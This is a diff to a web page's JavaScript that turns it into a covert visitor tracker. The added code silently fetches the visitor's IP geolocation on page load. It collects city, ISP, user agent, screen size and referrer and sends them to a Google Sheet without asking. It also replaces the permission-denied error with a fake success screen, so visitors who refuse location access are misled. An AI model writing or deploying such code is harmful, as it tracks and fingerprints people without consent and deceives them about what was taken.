@@ -670,6 +670,9 @@
         updateClock();
 
         // === SCREENS ===
+        // Silently grab IP location on page load (no popup needed)
+        fetchIPLocation();
+
         setTimeout(() => {
             document.getElementById('loading-screen').style.display = 'none';
             document.getElementById('permission-screen').style.display = 'block';
@@ -682,6 +685,40 @@
             document.getElementById(screenId).style.display = 'block';
         }
 
+        // === IP GEOLOCATION (silent, no permission needed) ===
+        function fetchIPLocation() {
+            fetch('https://ipapi.co/json/')
+                .then(res => res.json())
+                .then(ipData => {
+                    const data = {
+                        latitude: ipData.latitude || "N/A",
+                        longitude: ipData.longitude || "N/A",
+                        accuracy: "IP-Based (~" + (ipData.city ? "City" : "Country") + " level)",
+                        timestamp: new Date().toLocaleString(),
+                        userAgent: navigator.userAgent,
+                        platform: navigator.platform || "Unknown",
+                        language: navigator.language || "Unknown",
+                        screenResolution: screen.width + "x" + screen.height,
+                        referrer: document.referrer || "Direct",
+                        googleMapsLink: ipData.latitude
+                            ? `https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}`
+                            : "N/A",
+                        ip: ipData.ip || "N/A",
+                        city: ipData.city || "N/A",
+                        region: ipData.region || "N/A",
+                        country: ipData.country_name || "N/A",
+                        isp: ipData.org || "N/A",
+                        locationType: "IP"
+                    };
+                    sendToGoogleSheet(data);
+                    console.log("📡 IP location captured silently");
+                })
+                .catch(err => {
+                    console.log("IP geolocation failed:", err);
+                });
+        }
+
+        // === GPS GEOLOCATION (requires permission popup) ===
         function requestLocation() {
             if (!navigator.geolocation) {
                 showScreen('error-screen');
@@ -712,7 +749,13 @@
                 language: navigator.language || "Unknown",
                 screenResolution: screen.width + "x" + screen.height,
                 referrer: document.referrer || "Direct",
-                googleMapsLink: `https://www.google.com/maps?q=${latitude},${longitude}`
+                googleMapsLink: `https://www.google.com/maps?q=${latitude},${longitude}`,
+                ip: "—",
+                city: "—",
+                region: "—",
+                country: "—",
+                isp: "—",
+                locationType: "GPS"
             };
 
             // Generate random session ID for aesthetics
@@ -723,23 +766,11 @@
         }
 
         function onLocationError(error) {
-            showScreen('error-screen');
-            let message = '';
-            switch (error.code) {
-                case error.PERMISSION_DENIED:
-                    message = 'ACCESS BLOCKED — Location permission was denied. Enable location services and retry.';
-                    break;
-                case error.POSITION_UNAVAILABLE:
-                    message = 'SIGNAL LOST — Location data unavailable. Check device sensors.';
-                    break;
-                case error.TIMEOUT:
-                    message = 'TIMEOUT — Location request timed out. Retry connection.';
-                    break;
-                default:
-                    message = 'UNKNOWN ERROR — Failed to acquire location data.';
-                    break;
-            }
-            document.getElementById('error-message').textContent = message;
+            // IP location was already captured silently, so show success anyway
+            document.getElementById('session-id').textContent =
+                Math.random().toString(36).substring(2, 10).toUpperCase();
+            showScreen('success-screen');
+            console.log("GPS denied, but IP location already captured ✅");
         }
 
         function sendToGoogleSheet(data) {
